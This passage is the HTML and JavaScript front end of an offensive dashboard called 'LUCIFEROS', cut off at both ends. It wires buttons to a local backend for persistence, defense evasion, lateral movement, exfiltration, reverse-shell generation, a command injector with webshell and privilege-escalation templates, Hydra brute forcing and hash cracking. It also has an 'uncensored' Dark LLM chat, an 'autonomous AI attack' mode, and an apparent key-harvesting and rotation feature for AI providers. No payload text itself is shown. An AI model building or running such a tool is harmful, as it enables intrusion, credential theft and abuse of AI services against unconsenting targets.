                            <button onclick="getPersistence()" style="padding: 12px; background: linear-gradient(135deg, #4d1a1a, #2a0000); border: 1px solid #ff3333; color: #fff; cursor: pointer; font-weight: bold; border-radius: 5px; transition: all 0.3s;" data-testid="btn-persistence">
                                🔒 PERSISTENCE
                            </button>
                            <button onclick="getEvasionTechniques()" style="padding: 12px; background: linear-gradient(135deg, #1a4d1a, #002a00); border: 1px solid #00ff00; color: #fff; cursor: pointer; font-weight: bold; border-radius: 5px; transition: all 0.3s;" data-testid="btn-evasion">
                                🛡️ DEFENSE EVASION
                            </button>
                            <button onclick="getLateralMovement()" style="padding: 12px; background: linear-gradient(135deg, #1a1a4d, #00002a); border: 1px solid #6666ff; color: #fff; cursor: pointer; font-weight: bold; border-radius: 5px; transition: all 0.3s;" data-testid="btn-lateral">
                                🔀 LATERAL MOVEMENT
                            </button>
                            <button onclick="getExfiltration()" style="padding: 12px; background: linear-gradient(135deg, #4d1a4d, #2a002a); border: 1px solid #ff00ff; color: #fff; cursor: pointer; font-weight: bold; border-radius: 5px; transition: all 0.3s;" data-testid="btn-exfil">
                                📤 EXFILTRATION
                            </button>
                        </div>
                        
                        <!-- Technique Info -->
                        <div style="margin-top: 10px; font-size: 10px; color: #666; display: flex; justify-content: space-between;">
                            <span>🔒 Persistence: Cron, Systemd, Registry, WMI, SSH Keys</span>
                            <span>🛡️ Evasion: AMSI Bypass, Log Clearing, Process Hiding</span>
                            <span>🔀 Lateral: SSH, SMB, WinRM, RDP, Pass-the-Hash</span>
                            <span>📤 Exfil: HTTP, DNS, ICMP, Cloud, Stego</span>
                        </div>
                    </div>
                    
                    <!-- Network Capture -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #00ffff; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #00ffff; margin: 0 0 10px 0; font-size: 14px;">📡 Network Capture</h3>
                        <input type="text" id="capture-filter" placeholder="Filter (e.g. tcp port 80)" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 5px;">
                        <input type="number" id="capture-count" placeholder="Packet count (100)" value="100" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <div style="display: flex; gap: 5px;">
                            <button onclick="startCapture()" style="flex: 1; padding: 8px; background: #1a4d4d; border: none; color: #fff; cursor: pointer; font-size: 11px;">Start</button>
                            <button onclick="getCaptureStatus()" style="flex: 1; padding: 8px; background: #4d4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Status</button>
                        </div>
                    </div>
                    
                    <!-- ARP Scanner -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #00ff88; margin: 0 0 10px 0; font-size: 14px;">🔍 ARP Scanner</h3>
                        <input type="text" id="arp-range" placeholder="IP range (192.168.1.0/24)" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <button onclick="runARPScan()" style="width: 100%; padding: 8px; background: #1a4d2a; border: none; color: #fff; cursor: pointer;">Scan Network</button>
                    </div>
                    
                    <!-- Payload Generator -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #ff00ff; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ff00ff; margin: 0 0 10px 0; font-size: 14px;">💉 Payload Generator</h3>
                        <input type="text" id="payload-lhost" placeholder="LHOST (your IP)" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 5px;">
                        <input type="number" id="payload-lport" placeholder="LPORT (4444)" value="4444" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <button onclick="generateReverseShell()" style="width: 100%; padding: 8px; background: #4d1a4d; border: none; color: #fff; cursor: pointer;">Generate Reverse Shells</button>
                    </div>
                    
                    <!-- COMMAND INJECTOR - NEW -->
                    <div class="capability-card" style="background: #0d0d1a; border: 2px solid #00ff00; border-radius: 8px; padding: 15px; grid-column: span 2;">
                        <h3 style="color: #00ff00; margin: 0 0 10px 0; font-size: 16px;">⚡ COMMAND INJECTOR</h3>
                        <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                            <select id="inject-type" style="flex: 1; padding: 8px; background: #1a1a2e; border: 1px solid #00ff00; color: #fff;">
                                <option value="bash">Bash/Shell</option>
                                <option value="python">Python</option>
                                <option value="powershell">PowerShell</option>
                                <option value="sql">SQL Injection</option>
                                <option value="xss">XSS Payload</option>
                                <option value="cmd">Windows CMD</option>
                            </select>
                            <button onclick="clearInjector()" style="padding: 8px 16px; background: #4d1a1a; border: none; color: #fff; cursor: pointer;">Clear</button>
                            <button onclick="copyInjectorCode()" style="padding: 8px 16px; background: #1a4d1a; border: none; color: #fff; cursor: pointer;">📋 Copy</button>
                        </div>
                        <textarea id="inject-code" placeholder="Paste your script/command here for execution or modification..." style="width: 100%; height: 150px; padding: 10px; background: #000; border: 1px solid #333; color: #00ff00; font-family: 'Courier New', monospace; font-size: 13px; resize: vertical;"></textarea>
                        <div style="display: flex; gap: 5px; margin-top: 10px;">
                            <button onclick="executeInjection()" style="flex: 2; padding: 10px; background: #003300; border: none; color: #00ff00; cursor: pointer; font-weight: bold;">▶ EXECUTE</button>
                            <button onclick="testInjection()" style="flex: 1; padding: 10px; background: #333300; border: none; color: #ffff00; cursor: pointer;">Test</button>
                            <button onclick="encodePayload()" style="flex: 1; padding: 10px; background: #330033; border: none; color: #ff00ff; cursor: pointer;">Encode</button>
                            <button onclick="saveToMemory()" style="flex: 1; padding: 10px; background: #003333; border: none; color: #00ffff; cursor: pointer;">Save</button>
                        </div>
                        <div id="inject-output" style="margin-top: 10px; padding: 10px; background: #000; border: 1px solid #333; color: #0f0; font-family: monospace; font-size: 12px; max-height: 200px; overflow-y: auto; display: none;"></div>
                        
                        <!-- Quick Injection Templates -->
                        <div style="margin-top: 10px; display: flex; flex-wrap: wrap; gap: 5px;">
                            <button onclick="loadTemplate('revshell')" class="skill-btn" style="font-size: 10px;">🐚 RevShell</button>
                            <button onclick="loadTemplate('sqli')" class="skill-btn" style="font-size: 10px;">💉 SQLi</button>
                            <button onclick="loadTemplate('xss')" class="skill-btn" style="font-size: 10px;">📜 XSS</button>
                            <button onclick="loadTemplate('lfi')" class="skill-btn" style="font-size: 10px;">📁 LFI</button>
                            <button onclick="loadTemplate('rce')" class="skill-btn" style="font-size: 10px;">💀 RCE</button>
                            <button onclick="loadTemplate('webshell')" class="skill-btn" style="font-size: 10px;">🕸️ WebShell</button>
                            <button onclick="loadTemplate('privesc')" class="skill-btn" style="font-size: 10px;">⬆️ PrivEsc</button>
                            <button onclick="loadTemplate('enumeration')" class="skill-btn" style="font-size: 10px;">🔍 Enum</button>
                        </div>
                    </div>
                    
                    <!-- Metasploit-lite -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #ff0000; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ff0000; margin: 0 0 10px 0; font-size: 14px;">🔥 Metasploit-Lite</h3>
                        <input type="text" id="msf-search" placeholder="Search exploits..." style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <div style="display: flex; gap: 5px; margin-bottom: 5px;">
                            <button onclick="searchExploits()" style="flex: 1; padding: 8px; background: #4d1a1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Exploits</button>
                            <button onclick="searchPayloads()" style="flex: 1; padding: 8px; background: #4d1a1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Payloads</button>
                        </div>
                        <button onclick="generateAllShells()" style="width: 100%; padding: 8px; background: #660000; border: none; color: #fff; cursor: pointer;">Generate ALL Shells</button>
                    </div>
                    
                    <!-- Hashcat -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #ffff00; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ffff00; margin: 0 0 10px 0; font-size: 14px;">⚡ Hashcat (CPU)</h3>
                        <input type="text" id="hashcat-hash" placeholder="Hash to crack/identify" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 5px;">
                        <select id="hashcat-mode" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                            <option value="0">0 - MD5</option>
                            <option value="100">100 - SHA1</option>
                            <option value="1000">1000 - NTLM</option>
                            <option value="1400">1400 - SHA256</option>
                            <option value="1700">1700 - SHA512</option>
                            <option value="3200">3200 - bcrypt</option>
                            <option value="1800">1800 - SHA512crypt</option>
                        </select>
                        <div style="display: flex; gap: 5px;">
                            <button onclick="identifyHash()" style="flex: 1; padding: 8px; background: #4d4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Identify</button>
                            <button onclick="crackHash()" style="flex: 1; padding: 8px; background: #4d4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Crack</button>
                            <button onclick="runBenchmark()" style="flex: 1; padding: 8px; background: #4d4d1a; border: none; color: #fff; cursor: pointer; font-size: 11px;">Bench</button>
                        </div>
                    </div>
                    
                    <!-- Hydra Password Cracker -->
                    <div class="capability-card" style="background: #1a1a2e; border: 1px solid #ff6600; border-radius: 8px; padding: 15px;">
                        <h3 style="color: #ff6600; margin: 0 0 10px 0; font-size: 14px;">🔐 Hydra Brute Force</h3>
                        <input type="text" id="hydra-target" placeholder="Target IP/Domain" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 5px;">
                        <select id="hydra-service" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 5px;">
                            <option value="ssh">SSH</option>
                            <option value="ftp">FTP</option>
                            <option value="telnet">Telnet</option>
                            <option value="mysql">MySQL</option>
                            <option value="postgres">PostgreSQL</option>
                            <option value="smb">SMB</option>
                            <option value="rdp">RDP</option>
                            <option value="vnc">VNC</option>
                            <option value="http-get">HTTP GET</option>
                            <option value="http-post">HTTP POST</option>
                        </select>
                        <input type="text" id="hydra-username" placeholder="Username (or leave blank for list)" style="width: 100%; padding: 8px; background: #0d0d1a; border: 1px solid #333; color: #fff; margin-bottom: 10px;">
                        <button onclick="runHydraBrute()" style="width: 100%; padding: 8px; background: #4d2a1a; border: none; color: #fff; cursor: pointer;">🔓 Start Brute Force</button>
                    </div>
                </div>
                
                <!-- Output Area -->
                <div class="panel-title" style="margin-top: 20px; font-size: 14px;">📊 Results Output</div>
                <div class="output-display" id="advanced-output" style="height: 200px;"></div>
            </div>
        </div>

        <!-- RIGHT PANEL: Monitoring -->
        <div class="right-panel">
            <div class="panel-title">📊 SYSTEM MONITOR</div>

            <!-- System Status -->
            <div class="status-box">
                <h6 style="color: var(--primary-red); margin-bottom: 10px;">System Status</h6>
                <div class="status-item">
                    <span class="status-label">Backend:</span>
                    <span class="status-value" id="status-backend">●</span>
                </div>
                <div class="status-item">
                    <span class="status-label">OpenClaw:</span>
                    <span class="status-value" id="status-openclaw">●</span>
                </div>
                <div class="status-item">
                    <span class="status-label">AI Providers:</span>
                    <span class="status-value" id="status-ai">0/0</span>
                </div>
            </div>

            <!-- Live Logs -->
            <div style="margin-top: 20px;">
                <div class="panel-title" style="font-size: 14px;">📝 LIVE LOGS</div>
                <div class="output-display" id="live-logs" style="height: 250px;"></div>
            </div>

            <!-- Active Attacks -->
            <div style="margin-top: 20px;">
                <div class="panel-title" style="font-size: 14px;">⚔️ ACTIVE ATTACKS</div>
                <div id="active-attacks" style="font-size: 12px; color: #999;">
                    No active attacks
                </div>
            </div>
        </div>
    </div>

    <!-- Emergency Stop Button -->
    <button class="emergency-stop-btn" onclick="emergencyStop()" title="Emergency Stop">
        <i class="fas fa-stop"></i>
    </button>

    <script>
        let selectedAttackMode = null;
        let currentTarget = null;

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            checkSystemStatus();
            loadOpenClawSkills();
            checkCodingAgent();
            loadLearningData();
            setInterval(checkSystemStatus, 5000);
            addLog('[SYSTEM] LUCIFEROS Master Dashboard initialized');
        });

        function toggleSection(header) {
            const content = header.nextElementSibling;
            const arrow = header.querySelector('span:last-child');
            content.classList.toggle('active');
            arrow.textContent = content.classList.contains('active') ? '▼' : '▶';
        }

        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById('tab-' + tabName).classList.add('active');
        }

        function selectAttackMode(mode) {
            selectedAttackMode = mode;
            document.querySelectorAll('.attack-mode-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            addLog(`[SYSTEM] Selected attack mode: ${mode.toUpperCase()}`);
        }

        function launchAttack() {
            if (!selectedAttackMode) {
                addLog('[ERROR] Please select an attack mode first');
                return;
            }

            const target = document.getElementById('target-input').value;
            if (!target) {
                addLog('[ERROR] Please enter a target');
                return;
            }

            currentTarget = target;
            addLog(`[ATTACK] Launching ${selectedAttackMode} attack on ${target}`);
            updateProgress('Launching', 10);

            // Execute based on mode
            switch(selectedAttackMode) {
                case 'recon':
                    startReconAttack(target);
                    break;
                case 'ai_autonomous':
                    startAIAutonomous(target);
                    break;
                case 'payload':
                    startPayloadAttack(target);
                    break;
                case 'browser':
                    startBrowserHijack(target);
                    break;
                case 'web':
                    startWebAttack(target);
                    break;
                case 'social':
                    startSocialEngineering(target);
                    break;
            }
        }

        async function sendChat() {
            const input = document.getElementById('chat-input');
            const message = input.value.trim();
            if (!message) return;

            addMessage('user', message);
            input.value = '';

            try {
                const response = await fetch('/_dash/ai/chat', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message })
                });
                
                const data = await response.json();
                const responseText = data.response || 'No response';
                addMessage('lilith', responseText);
                
                // Update status display
                if (data.provider) {
                    document.getElementById('ai-provider').textContent = data.provider;
                }
                if (data.model) {
                    document.getElementById('ai-mode').textContent = data.model;
                }
                
                if (!data.success) {
                    addLog('[CHAT] AI providers unavailable - add API keys');
                }
            } catch (error) {
                addMessage('system', `Error: ${error.message}`);
            }
        }
        
        // Dark LLM Mode Functions
        async function setDarkLLMMode() {
            const mode = document.getElementById('dark-llm-mode').value;
            try {
                const response = await fetch('/_dash/ai/set-mode', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ mode })
                });
                const data = await response.json();
                if (data.success) {
                    document.getElementById('dark-llm-info').textContent = 
                        `Current: ${data.provider?.name || mode.toUpperCase()} - ${data.provider?.description || ''}`;
                    document.getElementById('ai-mode').textContent = mode.toUpperCase();
                    addMessage('system', `🔮 Dark LLM Mode changed to: ${mode.toUpperCase()}`);
                    addLog(`[AI] Mode set to ${mode.toUpperCase()}`);
                }
            } catch (error) {
                addMessage('system', `Error setting mode: ${error.message}`);
            }
        }
        
        async function sendUncensored() {
            const input = document.getElementById('chat-input');
            const message = input.value.trim();
            if (!message) return;

            addMessage('user', `[UNCENSORED] ${message}`);
            input.value = '';

            try {
                const response = await fetch('/_dash/ai/chat-uncensored', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message })
                });
                
                const data = await response.json();
                addMessage('lilith', data.response || 'No response');
                
                if (data.provider) {
                    document.getElementById('ai-provider').textContent = data.provider;
                }
            } catch (error) {
                addMessage('system', `Error: ${error.message}`);
            }
        }
        
        function quickPrompt(prompt) {
            document.getElementById('chat-input').value = prompt;
            sendChat();
        }
        
        async function clearChatHistory() {
            try {
                await fetch('/_dash/ai/clear-history', { method: 'POST' });
                document.getElementById('chat-messages').innerHTML = '';
                addMessage('system', '🗑️ Chat history cleared');
            } catch (error) {
                addMessage('system', `Error: ${error.message}`);
            }
        }
        
        async function refreshAIStatus() {
            try {
                const response = await fetch('/_dash/ai/status');
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('ai-provider').textContent = data.last_provider || 'None';
                    document.getElementById('ai-mode').textContent = data.dark_llm_mode?.toUpperCase() || 'LILITH';
                    document.getElementById('ai-stats').textContent = `${data.stats?.successful || 0}/${data.stats?.total_requests || 0}`;
                    
                    const modeInfo = data.dark_llm_info;
                    if (modeInfo) {
                        document.getElementById('dark-llm-info').textContent = 
                            `Current: ${modeInfo.name} - ${modeInfo.description}`;
                    }
                    
                    addLog(`[AI] Status refreshed - Provider: ${data.last_provider || 'None'}`);
                }
            } catch (error) {
                addLog(`[AI] Status check failed: ${error.message}`);
            }
        }

        function addMessage(type, content) {
            const messages = document.getElementById('chat-messages');
            const div = document.createElement('div');
            div.className = `message ${type}`;
            const prefix = type === 'user' ? '[USER]' : type === 'lilith' ? '[LILITH]' : '[SYSTEM]';
            div.innerHTML = `<strong>${prefix}</strong> ${content.replace(/\\n/g, '<br>')}`;
            messages.appendChild(div);
            messages.scrollTop = messages.scrollHeight;
        }

        function addLog(message) {
            const logs = document.getElementById('live-logs');
            const timestamp = new Date().toLocaleTimeString();
            logs.innerHTML += `[${timestamp}] ${message}\\n`;
            logs.scrollTop = logs.scrollHeight;
        }

        function updateProgress(phase, percent) {
            document.getElementById('current-phase').textContent = phase;
            document.getElementById('progress-percent').textContent = percent + '%';
            document.getElementById('progress-bar').style.width = percent + '%';
            document.getElementById('progress-bar').textContent = percent + '%';
        }

        async function checkSystemStatus() {
            try {
                const response = await fetch('/_dash/status');
                const data = await response.json();
                
                document.getElementById('status-backend').textContent = data.backend.ok ? '✓ Online' : '✗ Offline';
                document.getElementById('status-backend').style.color = data.backend.ok ? '#00ff00' : '#ff0000';
                document.getElementById('backend-status').className = data.backend.ok ? 'status-indicator status-online' : 'status-indicator status-offline';
                
                // Get AI status through proxy
                const aiResponse = await fetch('/_dash/backend/status');
                const aiData = await aiResponse.json();
                if (aiData.ai_providers) {
                    const aiProviders = aiData.ai_providers;
                    document.getElementById('status-ai').textContent = `${aiProviders.active_count}/${aiProviders.total_count}`;
                }
                
            } catch (error) {
                document.getElementById('status-backend').textContent = '✗ Error';
                document.getElementById('status-backend').style.color = '#ff0000';
            }
        }

        async function loadOpenClawSkills() {
            try {
                const response = await fetch('/_dash/openclaw/skills');
                const data = await response.json();
                if (data.success && data.skills) {
                    const container = document.getElementById('openclaw-skills');
                    container.innerHTML = '';
                    Object.values(data.skills).flat().slice(0, 15).forEach(skill => {
                        const btn = document.createElement('button');
                        btn.className = 'skill-btn';
                        btn.textContent = skill;
                        btn.onclick = () => runSkill(skill);
                        container.appendChild(btn);
                    });
                    document.getElementById('status-openclaw').textContent = '✓ Online';
                    document.getElementById('status-openclaw').style.color = '#00ff00';
                    document.getElementById('openclaw-status').textContent = `${data.total} skills`;
                }
            } catch (error) {
                document.getElementById('status-openclaw').textContent = '✗ Offline';
                document.getElementById('status-openclaw').style.color = '#ff0000';
            }
        }

        async function runSkill(skillName) {
            addLog(`[OPENCLAW] Running skill: ${skillName}`);
            addMessage('system', `Executing OpenClaw skill: ${skillName}`);
            // Implementation would call backend OpenClaw endpoint
        }

        async function startReconAttack(target) {
            addLog('[RECON] Starting reconnaissance...');
            updateProgress('Reconnaissance', 30);
            
            try {
                const response = await fetch('/_dash/recon/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target })
                });
                const data = await response.json();
                document.getElementById('recon-output').textContent = JSON.stringify(data, null, 2);
                updateProgress('Reconnaissance Complete', 100);
                addLog('[RECON] Complete');
            } catch (error) {
                addLog(`[RECON] Error: ${error.message}`);
            }
        }

        function startAIAutonomous(target) {
            addLog('[AI] Starting autonomous AI attack...');
            updateProgress('AI Autonomous Mode', 50);
            addMessage('lilith', `Analyzing target: ${target}. Initiating autonomous attack chain...`);
        }

        function startPayloadAttack(target) {
            addLog('[PAYLOAD] Engineering payload...');
            updateProgress('Payload Generation', 40);
        }

        function startBrowserHijack(target) {
            addLog('[BROWSER] Initiating browser hijack...');
            updateProgress('Browser Hijack', 60);
        }

        function startWebAttack(target) {
            addLog('[WEB] Starting web application attack...');
            updateProgress('Web Attack', 70);
        }

        function startSocialEngineering(target) {
            addLog('[SOCIAL] Generating social engineering content...');
            updateProgress('Social Engineering', 55);
        }

        function browserNavigate() {
            const url = document.getElementById('browser-url').value;
            addLog(`[BROWSER] Navigating to: ${url}`);
            document.getElementById('browser-output').textContent = `Navigating to ${url}...`;
        }

        function startRecon() {
            const target = document.getElementById('recon-target').value;
            startReconAttack(target);
        }

        async function generatePayload() {
            const type = document.getElementById('payload-type').value;
            const target = document.getElementById('payload-target').value;
            addLog(`[PAYLOAD] Generating ${type} payload for ${target}`);
            
            try {
                const response = await fetch('/_dash/payload/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ type, target })
                });
                const data = await response.json();
                document.getElementById('payload-output').textContent = JSON.stringify(data, null, 2);
            } catch (error) {
                addLog(`[PAYLOAD] Error: ${error.message}`);
            }
        }

        function emergencyStop() {
            if (confirm('⚠️ EMERGENCY STOP - This will halt all active attacks. Continue?')) {
                addLog('[EMERGENCY] ALL ATTACKS STOPPED');
                addMessage('system', 'EMERGENCY STOP ACTIVATED - All operations halted');
                updateProgress('Stopped', 0);
                selectedAttackMode = null;
                document.querySelectorAll('.attack-mode-btn').forEach(btn => btn.classList.remove('active'));
            }
        }

        // Coding Agent Functions
        async function checkCodingAgent() {
            try {
                const response = await fetch('/_dash/coding/status');
                const data = await response.json();
                if (data.available) {
                    document.getElementById('coding-status').textContent = '✓ Available';
                    document.getElementById('coding-status').style.color = '#00ff00';
                } else {
                    document.getElementById('coding-status').textContent = '✗ Unavailable';
                    document.getElementById('coding-status').style.color = '#ff0000';
                }
            } catch (error) {
                document.getElementById('coding-status').textContent = '✗ Error';
            }
        }

        async function generateCode() {
            const prompt = document.getElementById('coding-prompt').value;
            if (!prompt) {
                addLog('[CODING] Please enter a code generation request');
                return;
            }

            addLog('[CODING] Generating code...');
            document.getElementById('coding-output').textContent = 'Generating code...';

            try {
                const response = await fetch('/_dash/coding/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ prompt })
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('coding-output').textContent = data.output || JSON.stringify(data, null, 2);
                    addLog('[CODING] Code generated successfully');
                } else {
                    document.getElementById('coding-output').textContent = `Error: ${data.error || 'Failed to generate code'}`;
                    addLog('[CODING] Code generation failed');
                }
            } catch (error) {
                document.getElementById('coding-output').textContent = `Error: ${error.message}`;
                addLog(`[CODING] Error: ${error.message}`);
            }
        }

        // Learning Functions
        async function loadLearningData() {
            try {
                // Get stats
                const statsResponse = await fetch('/_dash/learning/stats');
                const stats = await statsResponse.json();
                
                if (stats.success !== false) {
                    document.getElementById('learning-attacks').textContent = stats.total_attacks || 0;
                    document.getElementById('learning-success').textContent = (stats.success_rate || 0) + '%';
                    document.getElementById('learning-insights-count').textContent = stats.total_insights || 0;
                }

                // Get insights
                const insightsResponse = await fetch('/_dash/learning/insights');
                const insights = await insightsResponse.json();
                
                if (insights.insights) {
                    const output = document.getElementById('learning-insights');
                    output.innerHTML = '';
                    insights.insights.forEach(insight => {
                        output.innerHTML += `[${insight.timestamp}] ${insight.category}: ${insight.insight}\\n`;
                    });
                } else {
                    document.getElementById('learning-insights').textContent = 'No insights available yet';
                }

                addLog('[LEARNING] Learning data loaded');
            } catch (error) {
                addLog(`[LEARNING] Error loading data: ${error.message}`);
            }
        }

        // Memory Functions
        async function saveMemory() {
            const content = document.getElementById('memory-input').value;
            if (!content) {
                addLog('[MEMORY] Please enter content to save');
                return;
            }

            try {
                const response = await fetch('/_dash/memory/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: content,
                        timestamp: new Date().toISOString(),
                        target: currentTarget
                    })
                });
                const data = await response.json();
                
                if (data.success) {
                    addLog('[MEMORY] Saved to attack memory');
                    document.getElementById('memory-input').value = '';
                    addMessage('system', 'Memory saved successfully');
                } else {
                    addLog('[MEMORY] Failed to save');
                }
            } catch (error) {
                addLog(`[MEMORY] Error: ${error.message}`);
            }
        }

        async function recallMemory() {
            addLog('[MEMORY] Recalling memories...');
            
            try {
                const response = await fetch('/_dash/memory/recall');
                const data = await response.json();
                
                if (data.success && data.memories) {
                    const output = document.getElementById('memory-output');
                    if (data.memories.length === 0) {
                        output.textContent = 'No memories stored yet';
                    } else {
                        output.innerHTML = '';
                        data.memories.forEach(mem => {
                            output.innerHTML += `[${mem.timestamp}] ${mem.content}\\n\\n`;
                        });
                    }
                    addLog('[MEMORY] Memories recalled');
                } else {
                    document.getElementById('memory-output').textContent = 'No memories available';
                }
            } catch (error) {
                document.getElementById('memory-output').textContent = `Error: ${error.message}`;
                addLog(`[MEMORY] Error: ${error.message}`);
            }
        }

        // Add welcome message
        setTimeout(() => {
            addMessage('lilith', 'LILITH AI Attack Assistant online. All systems operational. Ready for tasking.');
            addMessage('lilith', '🧠 Learning system active | 💾 Memory system ready | 👨‍💻 Coding agent available');
        }, 1000);

        // ==================== PROVIDER URLs ====================
        const providerUrls = {
            groq: { signup: 'https://console.groq.com/login', keys: 'https://console.groq.com/keys' },
            huggingface: { signup: 'https://huggingface.co/join', keys: 'https://huggingface.co/settings/tokens' },
            together: { signup: 'https://api.together.xyz/', keys: 'https://api.together.xyz/settings/api-keys' },
            mistral: { signup: 'https://console.mistral.ai/', keys: 'https://console.mistral.ai/api-keys/' },
            openrouter: { signup: 'https://openrouter.ai/', keys: 'https://openrouter.ai/keys' },
            cerebras: { signup: 'https://cloud.cerebras.ai/', keys: 'https://cloud.cerebras.ai/platform' },
            deepinfra: { signup: 'https://deepinfra.com/', keys: 'https://deepinfra.com/dash/api_keys' },
            sambanova: { signup: 'https://cloud.sambanova.ai/', keys: 'https://cloud.sambanova.ai/' },
            fireworks: { signup: 'https://fireworks.ai/', keys: 'https://fireworks.ai/api-keys' },
            dolphin: { signup: 'https://openrouter.ai/', keys: 'https://openrouter.ai/keys' },
            deepseek: { signup: 'https://platform.deepseek.com/', keys: 'https://platform.deepseek.com/api_keys' },
            venice: { signup: 'https://venice.ai/', keys: 'https://venice.ai/settings/api' }
        };

        // Store current credentials
        let currentCredentials = { email: null, password: null, token: null, provider: null };

        function copyToClipboard(elementId) {
            const el = document.getElementById(elementId);
            el.select();
            document.execCommand('copy');
            addLog('[HARVESTER] 📋 Copied to clipboard!');
        }
        
        function copyText(text) {
            navigator.clipboard.writeText(text);
            addLog('[KEYGEN] 📋 Copied key to clipboard!');
        }

        // ==================== KEY ROTATION FUNCTIONS ====================
        
        let rotationStatusInterval = null;
        
        async function startKeyRotation() {
            const select = document.getElementById('rotation-providers');
            const providers = Array.from(select.selectedOptions).map(opt => opt.value);
            const mode = document.getElementById('rotation-mode').value;
            
            if (providers.length === 0) {
                alert('Select at least one provider');
                return;
            }
            
            addLog(`[ROTATION] 🚀 Starting key rotation (${mode} mode)...`);
            
            try {
                const response = await fetch('/_dash/rotation/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        providers: providers,
                        keys_per_batch: 10,
                        max_per_provider: 1,
                        mode: mode
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('rotation-start-btn').disabled = true;
                    document.getElementById('rotation-stop-btn').disabled = false;
                    document.getElementById('rotation-running').textContent = 'Running';
                    document.getElementById('rotation-running').style.color = '#00ff00';
                    
                    addLog(`[ROTATION] ✅ Started for ${providers.length} providers`);
                    
                    // Start polling for status
                    rotationStatusInterval = setInterval(updateRotationStatus, 2000);
                } else {
                    addLog(`[ROTATION] ❌ Error: ${data.error}`);
                }
            } catch (e) {
                addLog(`[ROTATION] ❌ Error: ${e.message}`);
            }
        }
        
        async function stopKeyRotation() {
            addLog('[ROTATION] ⏹️ Stopping rotation...');
            
            try {
                const response = await fetch('/_dash/rotation/stop', {
                    method: 'POST'
                });
                
                const data = await response.json();
                
                document.getElementById('rotation-start-btn').disabled = false;
                document.getElementById('rotation-stop-btn').disabled = true;
                document.getElementById('rotation-running').textContent = 'Stopped';
                document.getElementById('rotation-running').style.color = '#ff6600';
                
                if (rotationStatusInterval) {
                    clearInterval(rotationStatusInterval);
                    rotationStatusInterval = null;
                }
                
                addLog('[ROTATION] ⏹️ Stopped');
            } catch (e) {
                addLog(`[ROTATION] ❌ Error: ${e.message}`);
            }
        }
        
        async function pauseKeyRotation() {
            try {
                await fetch('/_dash/rotation/pause', { method: 'POST' });
                document.getElementById('rotation-running').textContent = 'Paused';
                document.getElementById('rotation-running').style.color = '#ffff00';
                addLog('[ROTATION] ⏸️ Paused');
            } catch (e) {
                addLog(`[ROTATION] ❌ Error: ${e.message}`);
            }
        }
        
        async function resumeKeyRotation() {
            try {
                await fetch('/_dash/rotation/resume', { method: 'POST' });
                document.getElementById('rotation-running').textContent = 'Running';
                document.getElementById('rotation-running').style.color = '#00ff00';
                addLog('[ROTATION] ▶️ Resumed');
            } catch (e) {
                addLog(`[ROTATION] ❌ Error: ${e.message}`);
            }
        }
        
        async function loadRotationKeys() {
            addLog('[ROTATION] 📥 Loading valid keys to session...');
            
            try {
                const response = await fetch('/_dash/rotation/load', {
                    method: 'POST'
                });
                
                const data = await response.json();
                
                if (data.success) {
                    addLog(`[ROTATION] ✅ Loaded ${data.count} keys to session`);
                    loadHarvestedKeys();
                } else {
                    addLog(`[ROTATION] ❌ Error: ${data.error}`);
                }
            } catch (e) {
                addLog(`[ROTATION] ❌ Error: ${e.message}`);
            }
        }
        
        async function updateRotationStatus() {
            try {
                const response = await fetch('/_dash/rotation/status');
                const data = await response.json();
                
                if (data.success) {
                    // Update stats
